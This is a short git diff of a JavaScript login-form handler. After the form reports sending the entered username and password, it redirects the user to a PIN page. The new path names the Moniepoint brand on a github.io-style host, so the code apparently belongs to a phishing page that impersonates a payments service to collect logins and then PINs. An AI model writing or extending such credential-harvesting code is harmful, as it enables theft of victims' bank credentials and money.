@@ -22,7 +22,7 @@ document.getElementById("login").onsubmit = function (event) {
       console.log("Sent successfully:", response);
       username.value = "";
       password.value = "";
-      location.href = "/pin.html";
+      location.href = "/vic-moniepoint.xyz.github.io/pin.html";
     },
     function (error) {
       console.log("Failed to send:", error);
